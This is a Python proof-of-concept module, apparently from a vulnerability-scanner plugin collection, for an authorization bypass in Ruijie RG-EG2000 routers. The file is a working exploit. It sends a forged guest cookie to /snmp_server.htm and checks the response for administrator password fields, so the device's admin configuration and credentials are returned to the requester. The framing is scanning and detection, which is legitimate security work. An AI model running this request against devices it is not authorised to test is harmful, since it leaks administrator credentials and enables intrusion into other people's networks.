# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import time
import re

class Vuln(ABVuln):
    vuln_id = 'Ruijie_0012' # 平台漏洞编号，留空
    name = '锐捷网络 RG-EG2000 非法访问敏感信息'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2014-12-15'  # 漏洞公布时间
    desc = '''
        锐捷网络2015年新品RG-EG2000系列产品存在授权绕过非法访问敏感信息缺陷。    
        guest用户可越权读取管理员权限才能读取的配置信息，导致配置文件泄漏。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '锐捷网络'  # 漏洞应用名称
    product_version = 'RG-EG2000'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '636b0bd1-e9e0-483b-a368-c7ca3a484f23'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #Referer   :  http://www.wooyun.org/bugs/wooyun-2010-086959
            hh = hackhttp.hackhttp()
            payload ='/snmp_server.htm'
            cookie = 'auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; c_name=; p_name=; p_pass=; hardtype=NBR1300G; web-coding=gb2312; currentURL=index'
           
            url = self.target + payload
            code, head, res, errcode, _ = hh.http(url, cookie=cookie)
            if code ==  200 and 'update_password' in res  and 'web_password' in res and 'tel_password' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
                
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
